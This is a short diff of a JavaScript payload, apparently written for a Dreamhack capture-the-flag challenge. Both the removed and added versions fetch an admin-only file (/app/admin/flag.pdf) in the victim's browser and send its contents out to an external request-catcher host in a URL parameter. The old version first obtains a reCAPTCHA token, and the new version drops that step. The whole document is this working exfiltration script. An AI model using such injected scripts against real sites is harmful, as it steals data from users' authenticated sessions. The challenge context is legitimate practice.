@@ -1,12 +1,8 @@
-<script src="https://www.google.com/recaptcha/api.js?render=6LfENuMqAAAAACKXzqxsFr5PvFOg1OlBBu_o5_Vf"></script>
 <script>
-grecaptcha.ready(function() {
-  grecaptcha.execute('6LfENuMqAAAAACKXzqxsFr5PvFOg1OlBBu_o5_Vf', {action: 'submit'}).then(function(token) {
-    fetch("/app/admin/flag.pdf?token=" + token)
-      .then(r => r.text())
-      .then(flag => {
-        fetch("https://bcbbeeo.request.dreamhack.games/?flag=" + encodeURIComponent(flag));
-      });
+fetch("/app/admin/flag.pdf")
+  .then(r => r.text())
+  .then(flag => {
+    fetch("https://bcbbeeo.request.dreamhack.games/?flag=" + encodeURIComponent(flag))
   });
-});
 </script>
+
